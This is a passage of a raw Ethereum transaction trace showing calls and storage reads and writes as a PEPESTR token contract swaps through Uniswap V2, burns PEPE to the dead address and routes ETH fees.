        [693] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x698250...311933(PEPE) :: approve(address,uint256)
              status=OK, gasUsed=22629, value=0
              args: spender:address=0x7a250d5630b4cf539739df2c5dacb4c659f2488d, amount:uint256=2,686,660,841,999,298,079,004,274,927
              returns: bool=True

        [696] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: WETH()
              status=OK, gasUsed=275, value=0
              returns: address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2

          [697] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x74b05292d1d4b2b48b65261b07099d24244bcb069f138d9a6bfdcf776becac4d
                value=0x000000000000000000000000000000000000000008ae5a9014d493e109cbb0ef (2686660841999298079004274927)

        [698] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)
              status=OK, gasUsed=60559, value=0
              args: amountIn:uint256=2,686,660,841,999,298,079,004,274,927, amountOutMin:uint256=0, path:address[]=['0x6982508145454ce325ddbe47a25d4ec3d2311933', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2', '0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91'], to:address=0x000000000000000000000000000000000000dead, deadline:uint256=1,767,358,691

          [712] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                status=OK, gasUsed=598, value=0
                args: account:address=0x000000000000000000000000000000000000dead
                returns: uint256=222,094,219,254,637,245,269,776,807

            [713] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83
                  value=0x000000000000000000000000000000000000000000b7b647c02877a3462f99a7 (222094219254637245269776807)

            [724] CALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: transfer(address,uint256)
                  status=OK, gasUsed=3262, value=0
                  args: dst:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f, wad:uint256=8,909,107,977,050,340,696
                  returns: bool=True

            [730] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0x698250...311933(PEPE) :: balanceOf(address)
                  status=OK, gasUsed=624, value=0
                  args: account:address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=2,465,364,464,964,225,479,010,165,751,192

            [732] STATICCALL 0xa43fe1...ccec9f(0xa43f_UNI-V2) -> 0xc02aaa...756cc2(WETH) :: balanceOf(address)
                  status=OK, gasUsed=534, value=0
                  args: :address=0xa43fe16908251ee70ef74718545e4fe6c5ccec9f
                  returns: uint256=8,190,941,323,719,394,664,964

            [749] CALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: transfer(address,uint256)
                  status=OK, gasUsed=9373, value=0
                  args: recipient:address=0x000000000000000000000000000000000000dead, amount:uint256=32,153,277,176,072,554,601,717,142
                  returns: bool=True

              [750] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000011
                    value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

              [751] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                    value=0x0000000000000000000000000000000000000000002efe34b5e8cfd0dfbb3efd (56811041127568876293013245)

              [752] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x000000000000000000000000000000000000000000000000000000000000000f
                    value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

              [753] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000011
                    value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

              [754] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x000000000000000000000000000000000000000000000000000000000000000c
                    value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

              [755] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x6d3dbbe4e1df997eecb6a1f8f59ad7cc74d529749dd03c44dee5a5c7cdd189cd
                    value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

              [756] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x000000000000000000000000000000000000000000000000000000000000000c
                    value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

              [757] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0xf35870bfd952eda30d0ffcc70c6a13b5f9b7ce6cf825a0fb8824c32c6c9fd0fd
                    value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

              [758] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x43fedf50e12e5c047fbe3576d03ab50250348e9a6030f531ab6d4ce10f5b0303
                    value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

              [759] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0xc73b1d6eda13a615b81c31830292dbbbf5fbb07f472982e223002bd83d5c3dc4
                    value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

              [760] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x6d3dbbe4e1df997eecb6a1f8f59ad7cc74d529749dd03c44dee5a5c7cdd189cd
                    value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

              [761] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000012
                    value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

              [762] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000013
                    value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

              [763] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000016
                    value=0x0000000000000000000000000000000000000000002efe34b5e8cfd0dfbb3efd (56811041127568876293013245)

              [764] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x0000000000000000000000000000000000000000000000000000000000000016
                    prev=0x0000000000000000000000000000000000000000002efe34b5e8cfd0dfbb3efd (56811041127568876293013245)
                    curr=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)

              [765] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    value=0x00000000000000000000000000000000000000000044cc0a3f87136566b9b0c4 (83170507541389801080598724)

              [766] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    prev=0x00000000000000000000000000000000000000000044cc0a3f87136566b9b0c4 (83170507541389801080598724)
                    curr=0x00000000000000000000000000000000000000000042232afbbae7f48cab6102 (79955179823782545620427010)

              [767] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                    value=0x0000000000000000000000000000000000000000002efe34b5e8cfd0dfbb3efd (56811041127568876293013245)

              [768] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                    prev=0x0000000000000000000000000000000000000000002efe34b5e8cfd0dfbb3efd (56811041127568876293013245)
                    curr=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)

              [770] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    value=0x00000000000000000000000000000000000000000042232afbbae7f48cab6102 (79955179823782545620427010)

              [771] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    prev=0x00000000000000000000000000000000000000000042232afbbae7f48cab6102 (79955179823782545620427010)
                    curr=0x0000000000000000000000000000000000000000002a3351998d60fce22a932e (51017230365317246478881582)

              [772] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83
                    value=0x000000000000000000000000000000000000000000b7b647c02877a3462f99a7 (222094219254637245269776807)

              [773] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83
                    prev=0x000000000000000000000000000000000000000000b7b647c02877a3462f99a7 (222094219254637245269776807)
                    curr=0x000000000000000000000000000000000000000000cfa6212255fe9af0b0677b (251032168713102544411322235)

            [775] STATICCALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                  status=OK, gasUsed=598, value=0
                  args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
                  returns: uint256=51,017,230,365,317,246,478,881,582

              [776] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                    key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                    value=0x0000000000000000000000000000000000000000002a3351998d60fce22a932e (51017230365317246478881582)

          [784] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                status=OK, gasUsed=598, value=0
                args: account:address=0x000000000000000000000000000000000000dead
                returns: uint256=251,032,168,713,102,544,411,322,235

            [785] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x44ad89ba62b98ff34f51403ac22759b55759460c0bb5521eb4b6ee3cff49cf83
                  value=0x000000000000000000000000000000000000000000cfa6212255fe9af0b0677b (251032168713102544411322235)

            [786] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x74b05292d1d4b2b48b65261b07099d24244bcb069f138d9a6bfdcf776becac4f
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [787] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x74b05292d1d4b2b48b65261b07099d24244bcb069f138d9a6bfdcf776becac4f
                  prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                  curr=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

            [788] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000b
                  value=0x000000000000000000000000000000000000000000000000002386f26fc10000 (10000000000000000)

        [789] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7f07e5...e4b045 :: <selector fallback>
              status=OK, gasUsed=40, value=0.01

          [790] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000006
                prev=0x0000000000000000000000000000000000000000000000000000000000000002 (2)
                curr=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

      [793] STATICCALL 0x7f07e5...e4b045 -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
            status=OK, gasUsed=598, value=0
            args: account:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045
            returns: uint256=448,348,323,625,302,073,129,437,855

        [794] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
              key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
              value=0x00000000000000000000000000000000000000000172dd735342e26cbede0a9f (448348323625302073129437855)

        [796] CALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: transferFrom(address,address,uint256)
              status=OK, gasUsed=130995, value=0
              args: sender:address=0x7f07e5771e32f76b86e9b0ab42834f689ce4b045, recipient:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f, amount:uint256=448,348,323,625,302,073,129,437,755
              returns: bool=True

          [797] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000011
                value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

          [798] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                value=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)

          [799] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000f
                value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

          [800] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000011
                value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

          [801] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000c
                value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

          [802] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0xe177c4ea682f7fc3faa20b837be764300ece9345212304703d4a6ec0587b51af
                value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [803] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0xde610423843eb8562fb81bd4fd442fc6941e37ba18c59f29a3fc944467eee171
                value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [804] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0xf35870bfd952eda30d0ffcc70c6a13b5f9b7ce6cf825a0fb8824c32c6c9fd0fd
                value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [805] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000c
                value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

          [806] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000c
                prev=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)
                curr=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9101 (246441713447566193927747830265524037550827192160513)

          [807] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                value=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)

          [808] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000016
                value=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)

          [809] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000f
                value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

          [810] STATICCALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: WETH()
                status=OK, gasUsed=275, value=0
                returns: address=0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2

            [811] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x2a1b6066f3c122ec9cf1f62d3136b82dde9ba76705076a31a3b04f5cc34cbcd0
                  prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                  curr=0x000000000000000000000000000000000000000000084595161401484a000000 (10000000000000000000000000)

          [813] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x7a250d...f2488d(Uniswap V2: Router 2) :: swapExactTokensForETHSupportingFeeOnTransferTokens(uint256,uint256,address[],address,uint256)
                status=OK, gasUsed=72591, value=0
                args: amountIn:uint256=10,000,000,000,000,000,000,000,000, amountOutMin:uint256=0, path:address[]=['0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91', '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2'], to:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91, deadline:uint256=1,767,358,691

        [814] CALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: transferFrom(address,address,uint256)
              status=OK, gasUsed=9139, value=0
              args: sender:address=0xa89f4ca08f729364f0e1ce657c4b6d5ea60e1f91, recipient:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f, amount:uint256=10,000,000,000,000,000,000,000,000
              returns: bool=True

          [815] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000011
                value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

          [816] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                value=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)

          [817] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000f
                value=0x0000000000000000000000000000000000000000000069e10de76676d0800000 (500000000000000000000000)

          [818] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000011
                value=0x0000000000000000000000000000000000000000000000000000000000010100 (65792)

          [819] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000c
                value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9101 (246441713447566193927747830265524037550827192160513)

          [820] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x32eeeeb6b25952bae39741d22f889cede7ecc0dc7069d6ac9117cfeda9a3bd3d
                value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

          [821] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                value=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)

          [822] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                prev=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)
                curr=0x00000000000000000000000000000000000000000029617ee3a0f9f96fc98ebf (50026368845176131753184959)

          [823] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                value=0x0000000000000000000000000000000000000000002a3351998d60fce22a932e (51017230365317246478881582)

          [824] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                prev=0x0000000000000000000000000000000000000000002a3351998d60fce22a932e (51017230365317246478881582)
                curr=0x0000000000000000000000000000000000000000003278e6afa162452c2a932e (61017230365317246478881582)

          [826] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x2a1b6066f3c122ec9cf1f62d3136b82dde9ba76705076a31a3b04f5cc34cbcd0
                value=0x000000000000000000000000000000000000000000084595161401484a000000 (10000000000000000000000000)

          [827] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x2a1b6066f3c122ec9cf1f62d3136b82dde9ba76705076a31a3b04f5cc34cbcd0
                prev=0x000000000000000000000000000000000000000000084595161401484a000000 (10000000000000000000000000)
                curr=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

        [831] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
              status=OK, gasUsed=598, value=0
              args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
              returns: uint256=61,017,230,365,317,246,478,881,582

          [832] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                value=0x0000000000000000000000000000000000000000003278e6afa162452c2a932e (61017230365317246478881582)

          [845] STATICCALL 0xa72fec...a3fe6f(0xa72f_UNI-V2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
                status=OK, gasUsed=598, value=0
                args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
                returns: uint256=61,017,230,365,317,246,478,881,582

            [846] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  value=0x0000000000000000000000000000000000000000003278e6afa162452c2a932e (61017230365317246478881582)

        [861] CALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: <selector fallback>
              status=OK, gasUsed=55, value=3.76040520678740417

          [862] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x0000000000000000000000000000000000000000000000000000000000000016
                prev=0x00000000000000000000000000000000000000000031a713f9b4fb41b9c98ebf (60026368845176131753184959)
                curr=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

          [863] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x000000000000000000000000000000000000000000000000000000000000000d
                value=0x0000000000000000000000005763e08a55a9cf48b26537a356cef2e3fcd53282 (498909531061210001713288943164667751588544459394)

          [864] CALL 0xa89f4c...0e1f91(0xa89f_PEPESTR) -> 0x5763e0...d53282 :: <selector fallback>
                status=OK, gasUsed=0, value=0.752081041357480834

            [865] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000c
                  value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9101 (246441713447566193927747830265524037550827192160513)

            [866] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000c
                  prev=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9101 (246441713447566193927747830265524037550827192160513)
                  curr=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

            [867] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x000000000000000000000000000000000000000000000000000000000000000c
                  value=0x0000000000000000000000a89f4ca08f729364f0e1ce657c4b6d5ea60e1f9100 (246441713447566193927747830265524037550827192160512)

            [868] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0xde610423843eb8562fb81bd4fd442fc6941e37ba18c59f29a3fc944467eee171
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [869] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0xf35870bfd952eda30d0ffcc70c6a13b5f9b7ce6cf825a0fb8824c32c6c9fd0fd
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [870] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x6d3dbbe4e1df997eecb6a1f8f59ad7cc74d529749dd03c44dee5a5c7cdd189cd
                  value=0x0000000000000000000000000000000000000000000000000000000000000001 (1)

            [871] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000014
                  value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

            [872] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000015
                  value=0x000000000000000000000000000000000000000000000000000000000000000a (10)

            [873] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000016
                  value=0x0000000000000000000000000000000000000000000000000000000000000000 (0)

            [874] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x0000000000000000000000000000000000000000000000000000000000000016
                  prev=0x0000000000000000000000000000000000000000000000000000000000000000 (0)
                  curr=0x00000000000000000000000000000000000000000025162521ed16a4797c9a9f (44834832362530207312943775)

            [875] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                  value=0x00000000000000000000000000000000000000000172dd735342e26cbede0a9f (448348323625302073129437855)

            [876] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                  prev=0x00000000000000000000000000000000000000000172dd735342e26cbede0a9f (448348323625302073129437855)
                  curr=0x0000000000000000000000000000000000000000014dc74e3155cbc845617000 (403513491262771865816494080)

            [877] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                  value=0x00000000000000000000000000000000000000000029617ee3a0f9f96fc98ebf (50026368845176131753184959)

            [878] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x4eed8c642a228fa50362bd75e9667748e79b0268141bf841244ad8ced4b3f13d
                  prev=0x00000000000000000000000000000000000000000029617ee3a0f9f96fc98ebf (50026368845176131753184959)
                  curr=0x0000000000000000000000000000000000000000004e77a4058e109de946295e (94861201207706339066128734)

            [880] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                  value=0x0000000000000000000000000000000000000000014dc74e3155cbc845617000 (403513491262771865816494080)

            [881] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x5e96644cb304379e2272995073301ecac4316f50d8526c43e9c7ab561667e1fc
                  prev=0x0000000000000000000000000000000000000000014dc74e3155cbc845617000 (403513491262771865816494080)
                  curr=0x0000000000000000000000000000000000000000000000000000000000000064 (100)

            [882] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  value=0x0000000000000000000000000000000000000000003278e6afa162452c2a932e (61017230365317246478881582)

            [883] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                  prev=0x0000000000000000000000000000000000000000003278e6afa162452c2a932e (61017230365317246478881582)
                  curr=0x000000000000000000000000000000000000000001804034e0f72e0d718c02ca (464530721628089112295375562)

            [885] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x37c5b33b176e8e1f96f6ab18e55f7588076a9dc3a07f3239b2b26d14b5c1b18e
                  value=0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff (115792089237316195423570985008687907853269984665640564039457584007913129639935)

            [886] SLOT WRITE contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                  key=0x37c5b33b176e8e1f96f6ab18e55f7588076a9dc3a07f3239b2b26d14b5c1b18e
                  prev=0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff (115792089237316195423570985008687907853269984665640564039457584007913129639935)
                  curr=0xfffffffffffffffffffffffffffffffffffffffffe8d228cacbd1d934121f5c4 (115792089237316195423570985008687907853269984665640115691133958705840000202180)

        [892] STATICCALL 0x7a250d...f2488d(Uniswap V2: Router 2) -> 0xa89f4c...0e1f91(0xa89f_PEPESTR) :: balanceOf(address)
              status=OK, gasUsed=598, value=0
              args: account:address=0xa72fecc67208490fbf0eaf851ceea6e174a3fe6f
              returns: uint256=464,530,721,628,089,112,295,375,562

          [893] SLOT READ  contract=0xa89f4c...0e1f91(0xa89f_PEPESTR)
                key=0x319d07032843bfb818f4f5d5606c5362c22f38fd77b7f403ca71cd992831167e
                value=0x000000000000000000000000000000000000000001804034e0f72e0d718c02ca (464530721628089112295375562)

